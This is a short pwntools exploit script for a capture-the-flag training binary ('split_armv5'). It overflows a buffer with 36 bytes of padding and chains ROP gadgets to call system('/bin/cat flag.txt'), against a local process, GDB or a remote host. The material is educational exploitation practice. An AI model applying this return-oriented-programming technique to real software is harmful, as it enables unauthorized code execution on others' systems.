from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./split_armv5")


class ROPS:
    mov_r0_r3 = 0x00010558  # mov r0, r3; pop {fp, pc};
    pop_r3_pc = 0x000103a4


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROPS.pop_r3_pc,
        next(elf.search(b"/bin/cat flag.txt")),
        ROPS.mov_r0_r3,
        0xDEADBEEF,
        elf.plt.system
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()